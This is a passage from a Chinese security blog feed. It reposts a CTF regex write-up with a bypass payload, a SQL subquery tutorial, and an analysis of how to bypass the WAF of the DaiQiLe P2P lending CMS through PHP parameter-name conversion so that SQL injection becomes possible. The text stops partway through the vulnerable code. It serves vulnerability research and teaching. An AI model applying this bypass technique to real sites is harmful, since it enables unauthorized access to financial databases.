select:联合查询（联合查询的条件是前一条语句查询不到且字段数与前一条语句的查询字段数一致）<br>limit：限制显示个数（如：limit 0 2 表示从第一个开始显示两个）</p><p>————————————————</p><p>原文链接：<a href="https://blog.csdn.net/sdb5858874/article/details/80550319" target="_blank" rel="noopener">https://blog.csdn.net/sdb5858874/article/details/80550319</a></p></excerpt>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式</title>
      <link href="/2019/09/21/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2019/09/21/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <a id="more"></a><p>0X00<br>题目比较简单，就给出一段正则的代码：</p><p>$match = preg_match(“/ket.<em>key.{4,7}:\/.\/(.</em>key)/i”,trim($_GET[‘id’]),$matchcon);<br>if(​$match){<br>  echo $flag;<br>1<br>2<br>3<br>这个函数<br>知识补充：</p><p> int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )<br>1<br>搜索subject与pattern给定的正则表达式的一个匹配.<br>参数<br>pattern</p><p>要搜索的模式，字符串类型。<br>1<br>subject</p><p>输入字符串。<br>1<br>matches</p><p>如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推<br>1<br>所以这道题目就是id用GET的形式赋值，然后匹配前面的那段正则表达式。</p><p>拿出前面的正则表达式进行分析：<br>/ket.<em>key.{4,7}:\/.\/(.</em>key)/i<br>正则知识补充：</p><p>.   匹配除换行符 \n 之外的任何单字符。要匹配 . ，请使用 . </p><ul><li>匹配前面的子表达式零次或多次。要匹配 <em> 字符，请使用 \</em><br>{n,m}   m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。<br>1<br>2<br>3<br>ket.<em>key，它将会匹配最长的以ket开始，以key结束的字符串。这个随便构造ket1454key和ket1key一样的效果所以随便构造。只需要ket开头key结尾。<br>.{4,7}点号匹配任意字符，.{4,7}就是匹配任意字符4到7次可以是7777，jdijfh等等，随意。<br>:\/.\/ 前面转意所以加\中间有个点好也是匹配任意字符<br>(.</em>key)/i 这个比较明显就是key结尾就是，前面随便写i表达式的结尾处的不区分大小写 i 标记指定不区分大小写。</li></ul><p>所以构造patload:</p><p>?id=ket1key1111:/1/1key<br>1<br>?id=ket1ghtkey11rt11:/1/fg1key<br>1<br>答案不唯一有很多很多，随便构造！<br>————————————————</p><p>原文链接：<a href="https://blog.csdn.net/qq_29647709/article/details/81606933" target="_blank" rel="noopener">https://blog.csdn.net/qq_29647709/article/details/81606933</a></p></excerpt>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>后端基础SQL—高级查询与子查询</title>
      <link href="/2019/09/20/%E5%90%8E%E7%AB%AF%E5%9F%BA%E7%A1%80SQL%E2%80%94%E9%AB%98%E7%BA%A7%E6%9F%A5%E8%AF%A2%E4%B8%8E%E5%AD%90%E6%9F%A5%E8%AF%A2/"/>
      <url>/2019/09/20/%E5%90%8E%E7%AB%AF%E5%9F%BA%E7%A1%80SQL%E2%80%94%E9%AB%98%E7%BA%A7%E6%9F%A5%E8%AF%A2%E4%B8%8E%E5%AD%90%E6%9F%A5%E8%AF%A2/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <a id="more"></a><p>基本查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM 表;</span><br></pre></td></tr></table></figure><p>字段查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段1，字段2 FROM 表;</span><br></pre></td></tr></table></figure><p>条件查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM 表 WHERE 条件;</span><br></pre></td></tr></table></figure><p>结果查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM 表 ORDER BY 字段 [ASC(默认)/DESC];</span><br></pre></td></tr></table></figure><p>​    升序（从小到大）ASC ，降序（从大到小）DESC。</p><p>结果分页（限制）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM 表 LIMIT n,m;</span><br></pre></td></tr></table></figure><p>​    n表示从第几行开始，m表示取几条。</p><p>多种查询可以合并，先后顺序：</p><p>​    条件&gt;排序=分组&gt;分页（限制）</p><hr><hr><p>子查询术语：外部查询和内部查询<br>    外部查询：SELECT    MemberId    FROM    Members；<br>    内部查询：SELECT    MemberId    FROM    MembersDetails；<br>WHERE    MemberId = （SELECT    MAX(FilmId）   FROM    Films）；<br>在标准查询中嵌套–即放置在外部查询内—一个子查询，此时子查询被称为内部查询</p><hr><p>SELECT列表中的子查询：<br>可以将子查询作为select查询内的返回一个值得表达式，就像返回值中的单个列一样，但是，在一个表达式中子查询必须只返回一个巨鹿，这样的子查询被称为标量子查询。<br>SELECT    Category<br>     （SELECT    MAX(DVDPrice）    FROM    Films    WHERE    Films.CategoryId    =    Category.CategoryId),<br>CategoryId<br>FROM    Category;</p><hr><p>WHERE子句中的子查询：<br>例如：<br>SELECT   Category  ,  FilmName  ,  DVDPrice<br>FROM    Category    INNER    JOIN    Films<br>ON    Category .  CategoryId  =  Films .CategoryId<br>WHERE    Films .  DVDPrice  =<br>(SELECT    MIN(DVDPrice)    FROM    Films    WHERE    Films  .  CategoryId  =<br>Category.CategoryId);</p><hr><p>相关子查询：相关子查询是指访问外部查询的子查询</p><hr><p>用于其他语句的子查询：<br>在INSERT语句中使用子查询：<br>例如：<br>不需要再插入字面值：<br>INSERT    INTO    FavCategory  （CategoryId ，MemberId）    SELECT    7 , MemberId    FROM<br>MernberDetails    WHERE    LastName  =  ‘Hawthorn ’    AND    FirstName    =  ‘ Catherine ’</p><hr><p>在UPDATE 语句中使用子查询<br>例如：<br>SELECT    MAX( DVDPrice )    FROM    Films；<br>UPDATE    Films<br>SET    DVDPrice  =  （ SELECT    MAX( DVDPrice )    FROM    Films ）</p><hr><p>在DELETE   FROM语句中使用子查询<br>例如：<br>DELECT    FROM    Location<br>WHERE ( SELECT    COUNT( * )   FROM    MeMmberDetails<br>WHERE    Location.City  =  MemberDetails .City<br>AND<br>Location.State  =  Memberdetails.State<br>GROUP    BY    City  ,  State  )&lt;=1<br>  AND<br>LocationId    NOT    IN  (SELECT    LocationId    FROM    Attendance);</p><hr><p>高效查询的一些技巧：<br>1、当使用AND时，将很可能不为真的条件放在前面<br>2、当使用OR运算符时，将最可能为真的条件放在前面<br>3、DISTINCT  比 GROUP  BY更快<br>4、限制联合结果<br>5、对子查询使用IN 运算符<br>6、避免使用 SWLECT * FROM<br>7、对整数类型列进行搜索</p></excerpt>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>无需登录绕过waf可union-select跨表查询</title>
      <link href="/2019/09/07/%E6%97%A0%E9%9C%80%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87waf%E5%8F%AFunion-select%E8%B7%A8%E8%A1%A8%E6%9F%A5%E8%AF%A2/"/>
      <url>/2019/09/07/%E6%97%A0%E9%9C%80%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87waf%E5%8F%AFunion-select%E8%B7%A8%E8%A1%A8%E6%9F%A5%E8%AF%A2/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <p>被WAF武装的贷齐乐</p><a id="more"></a><h3 id="0x01-被WAF武装的贷齐乐"><a href="#0x01-被WAF武装的贷齐乐" class="headerlink" title="0x01 被WAF武装的贷齐乐"></a>0x01 <a href="https://bugs.leavesongs.com/php/%E8%B4%B7%E9%BD%90%E4%B9%90%E7%B3%BB%E7%BB%9F%E6%9C%80%E6%96%B0%E7%89%88sql%E6%B3%A8%E5%85%A5%EF%BC%88%E6%97%A0%E9%9C%80%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87waf%E5%8F%AFunion-select%E8%B7%A8%E8%A1%A8%E6%9F%A5%E8%AF%A2%EF%BC%89/" target="_blank" rel="noopener">被WAF武装的贷齐乐</a></h3><p>随便给一个贷齐乐最新版的SQL注入，如 http://<strong>.</strong>.<strong>.</strong>/index.php?blog&amp;q=viewfast&amp;id=xxx ，测试后可以发现，根本无法获取任何敏感信息，连数据库版本和用户名都没法获取。<br>贷齐乐这个系统，说起来也是安全问题比较严重的P2P金融类的CMS。由于连续出了多次安全漏洞，所以官方给贷齐乐系统中添加了严重影响正常使用的变态WAF。<br>我们先来看看WAF都有哪些功能。（由于我的代码非最新版，所以可能和实际测试有些出入）<br>/core/sqlin.inc.php，包含在config.inc.php中，所有请求都会经由此类过滤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">class sqlin &#123;</span><br><span class="line">function dowith_sql($str) &#123;</span><br><span class="line">$check= eregi(&apos;select|insert|update|delete|\&apos;|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile&apos;, $str);</span><br><span class="line">if($check)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;非法字符!&quot;;</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$newstr=&quot;&quot;;</span><br><span class="line">while($newstr!=$str)&#123;</span><br><span class="line">$newstr=$str;</span><br><span class="line">        $str = str_replace(&quot;script&quot;, &quot;&quot;, $str);</span><br><span class="line">        $str = str_replace(&quot;execute&quot;, &quot;&quot;, $str);</span><br><span class="line">        $str = str_replace(&quot;update&quot;, &quot;&quot;, $str);</span><br><span class="line">        //$str = str_replace(&quot;count&quot;, &quot;&quot;, $str);</span><br><span class="line">        //注释掉对count的过滤，不然account这样的参数会被截断</span><br><span class="line">        $str = str_replace(&quot;master&quot;, &quot;&quot;, $str);</span><br><span class="line">        $str = str_replace(&quot;truncate&quot;, &quot;&quot;, $str);</span><br><span class="line">        $str = str_replace(&quot;declare&quot;, &quot;&quot;, $str);</span><br><span class="line">        $str = str_replace(&quot;select&quot;, &quot;&quot;, $str);</span><br><span class="line">        $str = str_replace(&quot;create&quot;, &quot;&quot;, $str);</span><br><span class="line">        $str = str_replace(&quot;delete&quot;, &quot;&quot;, $str);</span><br><span class="line">        $str = str_replace(&quot;insert&quot;, &quot;&quot;, $str);</span><br><span class="line">        $str = str_replace(&quot;\&apos;&quot;, &quot;&quot;, $str);</span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line">return $str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">//aticle()防SQL注入函数//php教程</span><br><span class="line">    function sqlin() &#123;</span><br><span class="line"></span><br><span class="line">        foreach ($_GET as $key =&gt; $value) &#123;</span><br><span class="line">//echo $key.&quot;|&quot;.(strpos($key, &quot;password&quot;) == false);</span><br><span class="line">            if ($key != &quot;content&quot;&amp;&amp;strstr($key, &quot;password&quot;) == false) &#123;</span><br><span class="line">                $_GET[$key] = $this-&gt;dowith_sql($value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        foreach ($_POST as $key =&gt; $value) &#123;</span><br><span class="line">//echo $key.&quot;|&quot;.(strpos($key, &quot;password&quot;) == false);</span><br><span class="line">[email protected]_put_contents(&apos;wxy123123.txt&apos;, date(&apos;Ymd His&apos;) . &apos;提交url拼接 &apos;.$key.&quot;|&quot;.(strstr($key, &quot;password&quot;) == false), FILE_APPEND);</span><br><span class="line">            if ($key != &quot;content&quot;&amp;&amp;strstr($key, &quot;password&quot;) == false) &#123;</span><br><span class="line">                $_POST[$key] = $this-&gt;dowith_sql($value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">foreach ($_REQUEST as $key =&gt; $value) &#123;</span><br><span class="line">//echo $key.&quot;|&quot;.(strpos($key, &quot;password&quot;) == false);</span><br><span class="line">            if ($key != &quot;content&quot;&amp;&amp;strstr($key, &quot;password&quot;) == false) &#123;</span><br><span class="line">                $_REQUEST[$key] = $this-&gt;dowith_sql($value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GET/POST/REQUEST三个变量，都会经过这个正则：<code>select|insert|update|delete|\&#39;|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile</code>，你怕了吗？<br>一旦遇到select，包括单引号，包括注释符，就立即exit整个流程。<br>我们在宁波贷官网测试一下效果：</p><p><a href="https://bugs.leavesongs.com/images/2016/01/22/9e7cb3c8-4d99-4ec2-bb7d-bf76a3ad9fe9.jpg" target="_blank" rel="noopener"><img src="https://bugs.leavesongs.com/images/2016/01/22/9e7cb3c8-4d99-4ec2-bb7d-bf76a3ad9fe9.jpg" alt="14533972846845.jpg"></a></p><p>吓哭了吧？<br>这还只是WAF之一，再看 /core/safe.inc.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">/* 检查和转义字符 */</span><br><span class="line">function safe_str($str)&#123;</span><br><span class="line">    if(!get_magic_quotes_gpc()) &#123;</span><br><span class="line">        if( is_array($str) ) &#123;</span><br><span class="line">            foreach($str as $key =&gt; $value) &#123;</span><br><span class="line">                $str[$key] = safe_str($value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $str = addslashes($str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function dhtmlspecialchars($string) &#123;</span><br><span class="line">    if(is_array($string)) &#123;</span><br><span class="line">        foreach($string as $key =&gt; $val) &#123;</span><br><span class="line">            $string[$key] = dhtmlspecialchars($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $string = str_replace(array(&apos;&amp;&apos;, &apos;&quot;&apos;, &apos;&lt;&apos;, &apos;&gt;&apos;,&apos;(&apos;,&apos;)&apos;), array(&apos;&amp;amp;&apos;, &apos;&amp;quot;&apos;, &apos;&amp;lt;&apos;, &apos;&amp;gt;&apos;,&apos;（&apos;,&apos;）&apos;), $string);</span><br><span class="line">        if(strpos($string, &apos;&amp;amp;#&apos;) !== false) &#123;</span><br><span class="line">            $string = preg_replace(&apos;/&amp;amp;((#(\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;));)/&apos;, &apos;&amp;\\1&apos;, $string);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach ($_GET as $key =&gt; $value) &#123;</span><br><span class="line">    $_GET[$key] = safe_str($value);</span><br><span class="line">    $_GET[$key] = dhtmlspecialchars($value);</span><br><span class="line">&#125;</span><br><span class="line">foreach ($_POST as $key =&gt; $value) &#123;</span><br><span class="line">    $_POST[$key] = safe_str($value);</span><br><span class="line">    $_GET[$key] = dhtmlspecialchars($value);</span><br><span class="line">&#125;</span><br><span class="line">foreach ($_REQUEST as $key =&gt; $value) &#123;</span><br><span class="line">    $_REQUEST[$key] = safe_str($value);</span><br><span class="line">    $_REQUEST[$key] = dhtmlspecialchars($value);</span><br><span class="line">&#125;</span><br><span class="line">foreach ($_COOKIE as $key =&gt; $value) &#123;</span><br><span class="line">    $_COOKIE[$key] = safe_str($value);</span><br><span class="line">    $_GET[$key] = dhtmlspecialchars($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GET/POST/REQUEST/COOKIE都会经过这个替换<code>str_replace(array(&#39;&amp;&#39;, &#39;&quot;&#39;, &#39;&lt;&#39;, &#39;&gt;&#39;,&#39;(&#39;,&#39;)&#39;), array(&#39;&amp;amp;&#39;, &#39;&amp;quot;&#39;, &#39;&amp;lt;&#39;, &#39;&amp;gt;&#39;,&#39;（&#39;,&#39;）&#39;), $string)</code>，你怕了吗？<br>这个替换最明显的效果，就是所有的英文括号都变成中文括号，这导致我后面的SQL注入过程遇到了很大麻烦。<br>比如文章开头给的注入点，因为没有括号也没有select，所以我拿不到任何敏感信息：</p><p><a href="https://bugs.leavesongs.com/images/2016/01/22/b1428742-cce0-4465-afc0-8a8849ecc99c.jpg" target="_blank" rel="noopener"><img src="https://bugs.leavesongs.com/images/2016/01/22/b1428742-cce0-4465-afc0-8a8849ecc99c.jpg" alt="Mozilla_Firefox.png"></a></p><p>所以，原本千疮百孔的贷齐乐，穿了一件钢铁盔甲，仿佛成为了一个『安全』的P2P金融系统。</p><h3 id="0x02-变量获取的逻辑顺序"><a href="#0x02-变量获取的逻辑顺序" class="headerlink" title="0x02 变量获取的逻辑顺序"></a>0x02 变量获取的逻辑顺序</h3><p>那么，我们来总结一下贷齐乐这个CMS的特点：</p><ol><li>SQL注入漏洞很多</li><li>WAF拦截导致无法获取敏感信息</li></ol><p>那么，如果想找到可以使用的SQL注入漏洞，首要任务就是绕过WAF。通过阅读源码，我列出贷齐乐系统对于输入（包括WAF）的处理过程：</p><blockquote><p>index.php -&gt; config.inc.php -&gt; sqlin.php -&gt; safe.inc.php</p></blockquote><p>sqlin.php是对select、union、’等关键字的拦截。一旦发现存在这些关键字，就exit出整个执行流程。</p><p>safe.inc.php是替换一些敏感字符，比如&lt;、&gt;、(、)等。</p><p>但我在safe.inc.php里找到了如下一段代码（在替换之前）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$request_uri = explode(&quot;?&quot;, $_SERVER[&apos;REQUEST_URI&apos;]);</span><br><span class="line">if (isset($request_uri[1])) &#123;</span><br><span class="line">$rewrite_url = explode(&quot;&amp;&quot;, $request_uri[1]);</span><br><span class="line">foreach ($rewrite_url as $key =&gt; $value) &#123;</span><br><span class="line">$_value = explode(&quot;=&quot;, $value);</span><br><span class="line">if (isset($_value[1])) &#123;</span><br><span class="line">$_REQUEST[$_value[0]] = dhtmlspecialchars(addslashes($_value[1]));</span><br><span class="line">//$_REQUEST[$_value[0]] = addslashes($_value[1]);</span><br><span class="line">//$_REQUEST[$_value[0]] = dhtmlspecialchars($_value[1]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>用?分开，?后面的内容再用&amp;切割成数组，遍历这个数组。对数组中的每个字符串，再用=分成0和1，最后填入到<code>$_REQUEST</code>数组中：<code>$_REQUEST[$_value[0]] = dhtmlspecialchars(addslashes($_value[1]));</code></p><p>这个过程等于手工处理了一遍REQUEST_URI，将REQUEST_URI中的字符串分割成数组覆盖到REQUEST里。</p><p>按道理来说并没有什么大错误，但试想：这个过程是在我们的第一道WAF之后进行的，假设我们有一个方法让第一道WAF认为请求中没有恶意字符，再通过这里的覆盖，将恶意字符引入<code>$_REQUEST</code>中，就可以造成WAF的绕过了。</p><p>那么有什么办法让第一道WAF认为请求中没有恶意字符？这其实是个很难的问题，因为WAF会检测所有请求数组，只要有一个数组内的值存在问题，就直接退出。</p><h3 id="0x03-PHP小特性带来的大作用"><a href="#0x03-PHP小特性带来的大作用" class="headerlink" title="0x03 PHP小特性带来的大作用"></a>0x03 PHP小特性带来的大作用</h3><p>说漏洞之前，我们先写一个小脚本，在本地测试一些东西：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo $_REQUEST[&apos;foo1&apos;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>很简单一个输出请求数据的脚本。我们访问这个链接：/t.php?foo1=11111&amp;foo1=22222</p><p><a href="https://bugs.leavesongs.com/images/2016/01/22/4e9d3b89-9d06-4883-a8bc-d650fcae5262.jpg" target="_blank" rel="noopener"><img src="https://bugs.leavesongs.com/images/2016/01/22/4e9d3b89-9d06-4883-a8bc-d650fcae5262.jpg" alt="14534010852138.jpg"></a></p><p>输出的是22222，也就是说，当我们输入两个相同名字的参数的时候，php是取后一个的。这就是HTTP Parameter Pollution在PHP中的表现。<br>我将测试代码修改为如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function dhtmlspecialchars($string) &#123;</span><br><span class="line">    if(is_array($string)) &#123;</span><br><span class="line">        foreach($string as $key =&gt; $val) &#123;</span><br><span class="line">            $string[$key] = dhtmlspecialchars($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $string = str_replace(array(&apos;&amp;&apos;, &apos;&quot;&apos;, &apos;&lt;&apos;, &apos;&gt;&apos;,&apos;(&apos;,&apos;)&apos;), array(&apos;&amp;amp;&apos;, &apos;&amp;quot;&apos;, &apos;&amp;lt;&apos;, &apos;&amp;gt;&apos;,&apos;（&apos;,&apos;）&apos;), $string);</span><br><span class="line">        if(strpos($string, &apos;&amp;amp;#&apos;) !== false) &#123;</span><br><span class="line">            $string = preg_replace(&apos;/&amp;amp;((#(\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;));)/&apos;, &apos;&amp;\\1&apos;, $string);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$request_uri = explode(&quot;?&quot;, $_SERVER[&apos;REQUEST_URI&apos;]);</span><br><span class="line">if (isset($request_uri[1])) &#123;</span><br><span class="line">    $rewrite_url = explode(&quot;&amp;&quot;, $request_uri[1]);</span><br><span class="line">    foreach ($rewrite_url as $key =&gt; $value) &#123;</span><br><span class="line">        $_value = explode(&quot;=&quot;, $value);</span><br><span class="line">        if (isset($_value[1])) &#123;</span><br><span class="line">            $_REQUEST[$_value[0]] = dhtmlspecialchars(addslashes($_value[1]));</span><br><span class="line">            //$_REQUEST[$_value[0]] = addslashes($_value[1]);</span><br><span class="line">            //$_REQUEST[$_value[0]] = dhtmlspecialchars($_value[1]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $_REQUEST[&apos;foo2&apos;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>访问/t.php?foo2=11111&amp;foo2=22222，看看效果：</p><p><a href="https://bugs.leavesongs.com/images/2016/01/22/118677de-cf09-4b73-b248-5205a03e8067.jpg" target="_blank" rel="noopener"><img src="https://bugs.leavesongs.com/images/2016/01/22/118677de-cf09-4b73-b248-5205a03e8067.jpg" alt="14534011420236.jpg"></a></p><p>输出的是22222，也就是说，当我们输入两个相同名字的参数的时候，这段脚本也是取后一个的。<br>实验做完了，回到漏洞。<br>我一直在思考，假设我有一个办法，在第一次WAF检测参数的时候，检测的是22222，但后面覆盖request的时候，拿到的是11111，那么不就可以造成WAF的绕过了么？<br>但上述两个实验的结果表示，我这个假设是不成立的。二者获取的结果都是22222 。那么，这个思路是否就是不可行的了？<br>撸大师曾经提到过一个php特性： <a href="http://wooyun.org/bugs/wooyun-2010-064792" target="_blank" rel="noopener">http://wooyun.org/bugs/wooyun-2010-064792</a><br>php自身在解析请求的时候，如果参数名字中包含” “、”.”、”[“这几个字符，会将他们转换成下划线。<br>那么假设我发送的是这样一个请求： /t.php?user_id=11111&amp;user.id=22222 ，php先将user.id转换成user_id，即为/t.php?user_id=11111&amp;user_id=22222 ，再获取到的<code>$_REQUEST[&#39;user_id&#39;]</code>就是22222。<br>可在<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>中，user_id和user.id却是两个完全不同的参数名，那么切割覆盖后，获取的<code>$_REQUEST[&#39;user_id&#39;]</code>却是11111。<br>完美践行了我上述的思路：WAF检测的是22222，实际插入数据库的却是11111.</p><h3 id="0x04-实践是检验真理的唯一标准"><a href="#0x04-实践是检验真理的唯一标准" class="headerlink" title="0x04 实践是检验真理的唯一标准"></a>0x04 实践是检验真理的唯一标准</h3><p>上一节，实际上都是我在YY，这一节我需要找到一个真正满足条件的漏洞来。上述的绕过思路是有条件限制的，如下：</p><ol><li>先需要找到一个注入点</li><li>注入点可控变量需要获取自$_REQUEST</li><li>变量的名字必须包含下划线</li></ol><p>好找吗？其实在千疮百孔的贷齐乐系统中，这些条件很容易满足。文件 /core/user.class.php 394行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">public static function GetOne($data = array())&#123;</span><br><span class="line">    global $mysql;</span><br><span class="line">    $user_id = isset($data[&apos;user_id&apos;])?$data[&apos;user_id&apos;]:&quot;&quot;;</span><br><span class="line">    $username = isset($data[&apos;username&apos;])?$data[&apos;username&apos;]:&quot;&quot;;</span><br><span class="line">    $password = isset($data[&apos;password&apos;])?$data[&apos;password&apos;]:&quot;&quot;;</span><br><span class="line">    $email = isset($data[&apos;email&apos;])?$data[&apos;email&apos;]:&quot;&quot;;</span><br><span class="line">    $type_id = isset($data[&apos;type_id&apos;])?$data[&apos;type_id&apos;]:&quot;&quot;;</span><br><span class="line">    $sql = &quot;CREATE TABLE IF NOT EXISTS `&#123;user_cache&#125;` (</span><br><span class="line">         `user_id` int(11) NOT NULL DEFAULT &apos;0&apos;)&quot;;</span><br><span class="line">    $mysql -&gt;db_query($sql);</span><br><span class="line">    if ($user_id == &quot;&quot; &amp;&amp; $username == &quot;&quot;) return self::ERROR;</span><br><span class="line">    $sql = &quot;select p2.name as typename,p2.type,p3.*,p4.*,p5.*,p1.*  from `&#123;user&#125;` as p1 